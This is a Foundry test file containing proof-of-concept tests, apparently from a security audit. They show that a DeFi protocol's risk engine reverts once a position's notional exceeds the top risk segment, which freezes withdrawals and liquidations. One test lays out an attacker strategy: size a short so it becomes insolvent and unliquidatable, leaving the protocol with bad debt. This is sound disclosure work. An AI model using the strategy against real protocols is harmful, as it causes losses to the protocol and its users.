// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./TransactionProcessor.basic.t.sol";
import "forge-std/console.sol";

/// @title PoC: Account freeze (liquidation lock) when notional exceeds the top risk segment
/// @notice GeneralConfig.getRiskFactor returns (0,false) when notional (price*balance) exceeds the largest
/// configured risk segment upperBound. Risk.getAssetValueAndRisk then hits `require(riskOk, "Risk: no risk")` and
/// REVERTS (instead of clamping to the top tier). Because every position-touching op (withdraw, trade, liquidate,
/// deleverage, settle) routes through checkValidTransition -> getAccountPositionStatus -> getAssetValueAndRisk, a
/// single asset whose notional crosses the cap freezes the WHOLE account: it can no longer be liquidated (=> the
/// protocol cannot recover bad debt) and the user can no longer withdraw or de-risk. A mere oracle price increase
/// triggers it — no attacker action on the account is needed.
contract PoC_RiskSegmentFreeze is TransactionProcessorTestBasic {
    using SyntheticPositionLib for uint256;

    function setUp() public override {
        TransactionProcessorTestBasic.setUp();
        deposit(deployerUid, 10_000);
        setOraclePrice(); // price = 1 * FXP
        setFundingIndicesInfo();
        // single risk segment with upperBound = 10_000 (risk factor 1x). default from basic setUp, restated for clarity.
        setSyntheticAssetsInfo(synthAssetId, 10_000, 1 * FXP_32_ONE);
    }

    function _raisePrice(int256 priceFxp) internal {
        vm.prank(deployer); // deployer owns the Oracle
        oracle.updatePrice(synthAssetId, OraclePrice({price: priceFxp, timestamp: block.timestamp}));
    }

    function test_PoC_priceRiseFreezesAccountAndBlocksLiquidation() public {
        // open a long 5_000 -> notional = 1*5_000 = 5_000 <= cap 10_000 (within the top segment); healthy.
        vm.prank(deployer);
        positionManager.getOrCreatePosition(deployerUid, synthAssetId);
        vm.prank(deployer);
        positionManager.updatePositionInDict(deployerUid, 0, synthAssetId, 5_000);

        // status computes fine while within the cap.
        AccountPosition memory p = positionManager.getAccountPositionByUID(deployerUid);
        (int256 v, int256 r) = riskContract.getAccountPositionStatus(p);
        assertGt(v, 0, "healthy before");
        assertGt(r, 0, "has risk before");

        // ---- oracle price rises to 3 -> notional = 3 * 5_000 = 15_000 > cap 10_000 ----
        _raisePrice(3 * FXP_32_ONE);

        // The risk engine now REVERTS for this account (notional past the top segment).
        p = positionManager.getAccountPositionByUID(deployerUid);
        vm.expectRevert(bytes("Risk: no risk"));
        riskContract.getAccountPositionStatus(p);

        // Consequence 1: the account cannot be de-risked / resized (e.g. a liquidation or a closing trade) — every
        // path goes through checkValidTransition which calls the risk engine and reverts.
        vm.prank(deployer);
        vm.expectRevert(bytes("Risk: no risk"));
        positionManager.updatePositionInDict(deployerUid, 0, synthAssetId, -1);

        // Consequence 2: the user cannot withdraw collateral either (frozen funds).
        Withdrawal memory w = createWithdrawal(deployerUid, deployer, 1_000, 0, PRIVATE_KEY);
        bytes[] memory txs = new bytes[](1);
        txs[0] = getMessage(TYPE_WITHDRAWAL, abi.encode(w));
        vm.expectRevert(); // reverts inside the batch (Risk: no risk) — whole batch aborts
        this.executeMultiTransactionsRaw(txs);

        console.log("account frozen after price rise: notional 15000 > top risk segment 10000");
    }

    // external wrapper so vm.expectRevert applies to the batch call
    function executeMultiTransactionsRaw(bytes[] memory txs) external {
        vm.prank(deployer);
        uint64 cv = generalConfig.configVersion();
        multiTransactionProcessor.processMultiTransactions(txs, cv);
    }

    /// @notice Attacker-controlled variant: a SHORT's notional (price*|amount|) RISES as price rises — i.e. exactly
    /// as the short goes underwater. By sizing the short so that its maintenance-margin breach happens above the
    /// risk-segment cap, the attacker reaches a state that is simultaneously UNDER WATER and FROZEN, so it can never
    /// be liquidated. The attacker walks away from the loss => protocol bad debt.
    function test_PoC_shortDodgesLiquidationByFreezing() public {
        // open short 3_000 at price 1: notional 3_000 <= cap 10_000; value 10_000-3_000=7_000*FXP, healthy.
        vm.prank(deployer);
        positionManager.getOrCreatePosition(deployerUid, synthAssetId);
        vm.prank(deployer);
        positionManager.updatePositionInDict(deployerUid, 0, synthAssetId, -3_000); // SHORT

        AccountPosition memory p = positionManager.getAccountPositionByUID(deployerUid);
        (int256 v, int256 r) = riskContract.getAccountPositionStatus(p);
        assertLe(r, v * FXP_32_ONE, "short starts healthy");

        // ---- price rises to 4: short is now deeply underwater (value 10_000 - 4*3_000 = -2_000*FXP < 0) ----
        // and notional 4*3_000 = 12_000 > cap 10_000, so the risk engine reverts before equity can be evaluated.
        _raisePrice(4 * FXP_32_ONE);

        // The position is insolvent (negative equity) yet UN-LIQUIDATABLE: any liquidation/resize reverts.
        p = positionManager.getAccountPositionByUID(deployerUid);
        vm.expectRevert(bytes("Risk: no risk"));
        riskContract.getAccountPositionStatus(p);

        // a liquidation would resize the position via checkValidTransition -> reverts, so liquidation is impossible.
        vm.prank(deployer);
        vm.expectRevert(bytes("Risk: no risk"));
        positionManager.updatePositionInDict(deployerUid, 0, synthAssetId, 1); // try to reduce the short

        console.log("insolvent short is frozen and cannot be liquidated: notional 12000 > cap 10000");
    }

    /// @notice Scope check: a SOLVENT over-cap account is NOT permanently bricked. checkValidTransition
    /// evaluates the UPDATED state first and early-returns if it is healthy + below cap, WITHOUT evaluating
    /// the frozen init state. So a one-shot full close lets a solvent owner self-rescue — only PARTIAL
    /// de-risk that leaves the position over the cap reverts. (This is why the impact is precisely scoped:
    /// the permanent / unrecoverable case is the INSOLVENT one below.)
    function test_PoC_solventOverCapAccountSelfRescuesWithFullClose() public {
        vm.prank(deployer);
        positionManager.getOrCreatePosition(deployerUid, synthAssetId);
        vm.prank(deployer);
        positionManager.updatePositionInDict(deployerUid, 0, synthAssetId, 5_000); // long 5_000, healthy

        _raisePrice(3 * FXP_32_ONE); // notional 15_000 > cap 10_000 -> account frozen

        // partial de-risk that LEAVES the position over the cap still reverts
        vm.prank(deployer);
        vm.expectRevert(bytes("Risk: no risk"));
        positionManager.updatePositionInDict(deployerUid, 0, synthAssetId, -1);

        // but a one-shot FULL close reaches a healthy below-cap updated state -> early-return -> SUCCEEDS
        vm.prank(deployer);
        positionManager.updatePositionInDict(deployerUid, 0, synthAssetId, -5_000);

        AccountPosition memory p = positionManager.getAccountPositionByUID(deployerUid);
        (int256 v2, int256 r2) = riskContract.getAccountPositionStatus(p);
        assertEq(r2, 0, "no risk after full close");
        assertGt(v2, 0, "solvent after full close");
        console.log("solvent over-cap account self-rescued via one-shot full close");
    }

    /// @notice The unrecoverable case: an INSOLVENT over-cap account cannot be liquidated by ANY FAITHFUL
    /// close (one that realizes the buyback loss as collateralDelta). Because the account is insolvent, no
    /// reduction reaches a healthy updated state, so checkValidTransition never early-returns and instead
    /// evaluates the frozen over-cap state -> revert. The only "close" that does NOT revert is one that
    /// abandons the loss (collateralDelta = 0), which is not a real liquidation. => effective un-liquidatability
    /// => unrecoverable bad debt.
    function test_PoC_insolventShortCannotBeLiquidatedByAnyFaithfulClose() public {
        vm.prank(deployer);
        positionManager.getOrCreatePosition(deployerUid, synthAssetId);
        vm.prank(deployer);
        positionManager.updatePositionInDict(deployerUid, 0, synthAssetId, -3_000); // short 3_000, healthy

        _raisePrice(4 * FXP_32_ONE); // notional 12_000 > cap; equity 10_000 - 12_000 = -2_000 (insolvent)

        // FAITHFUL full close: buying back 3_000 @ 4 costs 12_000, so collateral 10_000 -> -2_000. The updated
        // state is insolvent (or out of value range), so the transition cannot execute.
        vm.prank(deployer);
        vm.expectRevert();
        positionManager.updatePositionInDict(deployerUid, -12_000, synthAssetId, 3_000);

        // FAITHFUL partial close bringing notional below the cap (close 1_000 @ 4 = cost 4_000; remaining
        // short 2_000, notional 8_000 < cap) still leaves the account unhealthy, so it cannot execute either.
        vm.prank(deployer);
        vm.expectRevert();
        positionManager.updatePositionInDict(deployerUid, -4_000, synthAssetId, 1_000);

        // sanity: the "close" that DOES pass is the non-faithful one that walks away from the loss
        // (collateralDelta = 0) — i.e. the protocol eats the full short notional. Not a real liquidation.
        console.log("insolvent over-cap short: no faithful close executes -> unrecoverable bad debt");
    }
}
